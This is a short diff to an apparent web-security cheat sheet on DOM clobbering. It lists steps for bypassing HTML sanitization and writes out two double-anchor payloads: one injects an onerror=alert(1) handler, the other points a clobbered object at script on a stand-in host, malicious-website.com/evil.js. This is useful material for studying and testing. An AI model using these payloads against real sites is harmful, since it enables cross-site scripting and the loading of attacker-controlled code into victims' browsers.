@@ -57,7 +57,8 @@ DOM Clobbering use the HTMLCollection vulnerability which allow you to add to th
 #### Steps:
 1. find a form where you can submit some html
 2. check in the javascript if there is a ```window.element || something here``` 
-3. bypass the sanitization with double anchortag ```<a id=defaultAvatar><<a id=defaultAvatar name=avatar href='cid:"onerror=alert(1)//)"'>
+3. bypass the sanitization with double anchortag
+  - ```<a id=defaultAvatar><<a id=defaultAvatar name=avatar href='cid:"onerror=alert(1)//)"'>```
   - ```<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>```
 
 
